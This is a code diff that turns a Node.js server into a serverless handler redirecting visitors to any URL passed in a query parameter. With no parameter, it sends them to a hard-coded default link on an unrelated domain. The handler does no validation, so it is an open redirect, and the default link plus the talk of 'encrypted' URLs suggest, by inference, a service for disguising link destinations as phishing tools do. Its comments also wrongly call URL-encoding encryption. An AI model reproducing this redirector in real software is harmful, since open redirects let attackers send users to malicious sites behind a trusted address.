@@ -1,35 +1,26 @@
-const http = require('http');
-const url = require('url');
+module.exports = (req, res) => {
+    // Get the query parameter 'url' from the request
+    const encryptedUrl = req.query.url;
 
-// Function to escape the URL (encryption method)
-function escapeUrl(inputUrl) {
-    return encodeURIComponent(inputUrl);
-}
+    // Default link to redirect to (in case no URL is provided)
+    const defaultUrl = 'https://view.richtonparks.com/KDJEDK';
 
-// Function to unescape the URL (decryption method)
-function unescapeUrl(inputUrl) {
-    return decodeURIComponent(inputUrl);
-}
+    // If the 'url' query parameter is provided
+    if (encryptedUrl) {
+        try {
+            // Decode the URL (the encrypted URL)
+            const decodedUrl = decodeURIComponent(encryptedUrl);
 
-// Create an HTTP server
-const server = http.createServer((req, res) => {
-    // Example URL to redirect to
-    const urlToRedirect = 'https://view.richtonparks.com/KDJEDK';
-
-    // Encrypt (escape) the URL
-    const encryptedUrl = escapeUrl(urlToRedirect);
-
-    // Send a 301 permanent redirect to the encrypted URL
-    res.writeHead(301, { 'Location': '/' + encryptedUrl });
-    res.end();
-});
-
-// Start the server on port 8080
-server.listen(8080, () => {
-    console.log('Server running on port 8080...');
-    
-    // Example: Encode a URL (escape it)
-    const urlToRedirect = 'https://view.richtonparks.com/KDJEDK';
-    const encryptedUrl = escapeUrl(urlToRedirect);
-    console.log(`Encrypted URL: /${encryptedUrl}`);
-});
+            // Send the redirect response with status 301 (permanent redirect)
+            res.writeHead(301, { 'Location': decodedUrl });
+            res.end();
+        } catch (err) {
+            // If there is an error decoding the URL, send a bad request response
+            res.status(400).send('Bad Request: Invalid URL encoding.');
+        }
+    } else {
+        // If no 'url' query parameter is provided, redirect to the default URL
+        res.writeHead(301, { 'Location': defaultUrl });
+        res.end();
+    }
+};
